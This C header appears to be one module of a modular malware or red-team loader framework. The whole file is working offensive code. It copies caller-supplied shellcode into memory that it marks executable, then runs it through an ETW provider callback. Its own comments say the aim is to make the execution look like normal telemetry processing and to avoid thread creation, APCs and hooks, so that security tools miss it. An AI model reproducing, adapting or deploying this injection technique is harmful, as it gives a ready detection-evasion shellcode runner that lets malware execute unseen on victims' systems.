// chunk: evasion/etw_callback_inject
// depends: (none)
// provides: setup_etw_callback_inject
// headers: windows.h
// risk: medium
// note: ETW provider callback injection — registers an ETW provider with a callback
//       that points to our payload. When events are written to that provider, the
//       ETW subsystem invokes the callback from a legitimate system call path.
//       Execution originates from the ETW infrastructure (ntdll!EtwpNotificationThread)
//       making it appear as normal telemetry processing. One-shot: deregisters after
//       first invocation. No thread creation, no APC, no hooks.

#ifndef CHUNK_ETW_CALLBACK_INJECT
#define CHUNK_ETW_CALLBACK_INJECT

#include <windows.h>

/* REGHANDLE not in MinGW headers */
#ifndef REGHANDLE
typedef ULONGLONG REGHANDLE;
typedef REGHANDLE *PREGHANDLE;
#endif

/* ETW function typedefs */
typedef ULONG (WINAPI *pfnEventRegister)(
    LPCGUID ProviderId,
    PVOID EnableCallback,
    PVOID CallbackContext,
    PREGHANDLE RegHandle);

typedef ULONG (WINAPI *pfnEventWrite)(
    REGHANDLE RegHandle,
    PVOID EventDescriptor,
    ULONG UserDataCount,
    PVOID UserData);

typedef ULONG (WINAPI *pfnEventUnregister)(REGHANDLE RegHandle);

/* Minimal EVENT_DESCRIPTOR if not defined */
#ifndef _EVENT_DESCRIPTOR_DEFINED
#define _EVENT_DESCRIPTOR_DEFINED
typedef struct _EVENT_DESCRIPTOR_S {
    USHORT Id;
    UCHAR  Version;
    UCHAR  Channel;
    UCHAR  Level;
    UCHAR  Opcode;
    USHORT Task;
    ULONGLONG Keyword;
} EVENT_DESCRIPTOR_S;
#endif

typedef struct _ETW_CB_CTX {
    BYTE          *payload;
    DWORD          payload_size;
    PVOID          exec_mem;
    REGHANDLE      reg_handle;
    volatile LONG  fired;
} ETW_CB_CTX;

static ETW_CB_CTX _etw_cb_ctx = {0};
static pfnEventUnregister _pEventUnregister = NULL;

/*
 * ETW enable callback — invoked when the provider's enable state changes
 * or when an event is written. We use this as our execution trigger.
 */
static VOID NTAPI _etw_enable_callback(
    LPCGUID SourceId,
    ULONG IsEnabled,
    UCHAR Level,
    ULONGLONG MatchAnyKeyword,
    ULONGLONG MatchAllKeyword,
    PVOID FilterData,
    PVOID CallbackContext)
{
    (void)SourceId; (void)Level; (void)MatchAnyKeyword;
    (void)MatchAllKeyword; (void)FilterData;

    ETW_CB_CTX *ctx = (ETW_CB_CTX *)CallbackContext;
    if (!ctx) return;

    /* One-shot: only fire once */
    if (InterlockedCompareExchange(&ctx->fired, 1, 0) != 0)
        return;

    if (ctx->exec_mem) {
        ((void (*)(void))ctx->exec_mem)();
    }

    /* Deregister provider to clean up */
    if (_pEventUnregister && ctx->reg_handle) {
        _pEventUnregister(ctx->reg_handle);
        ctx->reg_handle = 0;
    }
}

/*
 * setup_etw_callback_inject: Register an ETW provider with our callback,
 * then write an event to trigger it.
 *
 * payload:      shellcode / position-independent code
 * payload_size: size in bytes
 *
 * Returns 1 on success, 0 on failure.
 */
static int setup_etw_callback_inject(BYTE *payload, DWORD payload_size) {
    /* Resolve ETW functions from advapi32 */
    HMODULE advapi = GetModuleHandleA("advapi32.dll");
    if (!advapi) advapi = LoadLibraryA("advapi32.dll");
    if (!advapi) return 0;

    pfnEventRegister pEventRegister =
        (pfnEventRegister)GetProcAddress(advapi, "EventRegister");
    pfnEventWrite pEventWrite =
        (pfnEventWrite)GetProcAddress(advapi, "EventWrite");
    _pEventUnregister =
        (pfnEventUnregister)GetProcAddress(advapi, "EventUnregister");

    if (!pEventRegister || !pEventWrite || !_pEventUnregister) return 0;

    /* Allocate executable memory for payload */
    PVOID exec_mem = VirtualAlloc(NULL, payload_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!exec_mem) return 0;

    memcpy(exec_mem, payload, payload_size);

    DWORD old_prot;
    VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &old_prot);

    _etw_cb_ctx.payload = payload;
    _etw_cb_ctx.payload_size = payload_size;
    _etw_cb_ctx.exec_mem = exec_mem;
    _etw_cb_ctx.reg_handle = 0;
    _etw_cb_ctx.fired = 0;

    /* Generate a random GUID for our provider (avoid collision) */
    GUID provider_guid;
    HMODULE ole32 = GetModuleHandleA("ole32.dll");
    if (!ole32) ole32 = LoadLibraryA("ole32.dll");
    if (ole32) {
        typedef HRESULT (WINAPI *pfnCoCreateGuid)(GUID *);
        pfnCoCreateGuid pCoCreateGuid =
            (pfnCoCreateGuid)GetProcAddress(ole32, "CoCreateGuid");
        if (pCoCreateGuid) pCoCreateGuid(&provider_guid);
        else memset(&provider_guid, 0x41, sizeof(provider_guid));
    } else {
        memset(&provider_guid, 0x41, sizeof(provider_guid));
    }

    /* Register ETW provider with our callback */
    ULONG status = pEventRegister(
        &provider_guid,
        (PVOID)_etw_enable_callback,
        &_etw_cb_ctx,
        &_etw_cb_ctx.reg_handle);

    if (status != 0) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        _etw_cb_ctx.exec_mem = NULL;
        return 0;
    }

    /* Write a minimal event to trigger the callback pipeline */
    EVENT_DESCRIPTOR_S evt = {0};
    evt.Id = 1;
    evt.Level = 4;  /* Information */
    pEventWrite(_etw_cb_ctx.reg_handle, &evt, 0, NULL);

    return 1;
}

#endif
